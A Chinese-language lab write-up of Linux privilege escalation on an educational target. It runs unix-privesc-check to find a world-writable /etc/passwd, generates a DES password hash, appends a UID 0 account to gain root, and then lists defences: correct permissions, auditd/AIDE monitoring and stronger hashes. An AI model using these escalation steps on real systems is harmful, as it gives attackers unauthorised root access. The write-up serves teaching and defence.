# Linux 權限提升實作：世界可寫設定檔與 /etc/passwd 竄改

> 以自動化列舉找出 world-writable 的關鍵設定檔，並示範竄改 /etc/passwd 直接取得 root。

## 背景

本篇對應 Linux 提權實作。許多 Linux 提權並非來自軟體漏洞，而是把關鍵設定檔（如 `/etc/passwd`、`/etc/sudoers`）暴露在世界可寫入（World-Writable）的狀態，等於直接給攻擊者越權的跳板。環境為教育用隔離靶機，以低權限使用者透過 SSH 連入。

## 核心概念

### 自動化列舉（unix-privesc-check）

用 `scp` 把 `unix-privesc-check` 腳本送到靶機 `/tmp/`，賦予執行權限後執行標準掃描並把輸出導向檔案，再用 `grep` 搜 `WARNING`：

```bash
# 概念示意
scp unix-privesc-check user@<target>:/tmp/
chmod +x /tmp/unix-privesc-check
/tmp/unix-privesc-check standard > /tmp/output.txt
grep WARNING /tmp/output.txt
```

掃描回報 `/etc/passwd` 與 `/etc/sudoers` 都被設為 world-writable，屬於極高風險的組態弱點。

### 密碼雜湊演算法辨識

用 `openssl passwd` 產生雜湊，再從長度與字首特徵判斷演算法：

```bash
openssl passwd w00t
# 產生 13 字元的字串（例如 ojbvr23ASYRj6）→ 傳統 DES 雜湊
```

13 個字元、無 `$` 字首是傳統 DES crypt 的特徵；`$1$` 為 MD5、`$5$` 為 SHA-256、`$6$` 為 SHA-512。

### 竄改 /etc/passwd 取得 root

當 `/etc/passwd` 權限為 `-rw-rw-rw-`（所有人可寫）時，可直接把一個 UID/GID 為 0 的偽造帳號附加進去：

```bash
ls -l /etc/passwd          # -rw-rw-rw- 代表所有人可寫
# 產生雜湊
openssl passwd w00t        # 例：CJis6Xjem/MFs
# 將 UID/GID=0 的偽造帳號寫入 /etc/passwd（newroot:雜湊:0:0:...:/bin/bash）
su newroot                 # 輸入明文密碼切換
id                         # uid=0(root) → 提權成功
```

歷史上 `/etc/passwd` 可直接放密碼雜湊（第二欄），現代系統多改放在 `/etc/shadow`，但若 `/etc/passwd` 仍接受雜湊且可寫，這條路徑依然成立。拿到 root 後以 `find / -name '*flag*'` 搜尋目標檔案。

## 偵測與防禦

| 弱點 | 防禦 | 對應 ATT&CK |
|---|---|---|
| world-writable `/etc/passwd`、`/etc/sudoers` | 權限應為 `644` / `440`，定期稽核關鍵檔案權限 | T1222（File and Directory Permissions Modification）|
| 可寫設定檔被塞入 root 帳號 | 檔案完整性監控（AIDE、auditd 監看 `/etc/passwd` 寫入）| T1098 / T1136（Account Manipulation / Create Account）|
| 弱雜湊（DES）| 改用 SHA-512（`$6$`）或更強的 KDF | — |

偵測面向：用 `auditd` 對 `/etc/passwd`、`/etc/sudoers` 設定 watch rule，任何寫入都記錄；定期跑 world-writable 檔案掃描（`find / -perm -0002 -type f`）。

## 重點整理

- Linux 提權常見根因是關鍵設定檔的權限配置錯誤，而非程式漏洞。
- `unix-privesc-check` 能快速標出 world-writable 的高風險檔案。
- 從雜湊長度與字首可辨識演算法；13 字元無字首即傳統 DES。
- 可寫的 `/etc/passwd` 讓攻擊者直接寫入 UID 0 帳號取得 root。
- 防禦靠正確檔案權限 + 完整性監控，而非單一控制。

## 參考資料

- [MITRE ATT&CK T1222 — File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/)
- [MITRE ATT&CK T1136 — Create Account](https://attack.mitre.org/techniques/T1136/)
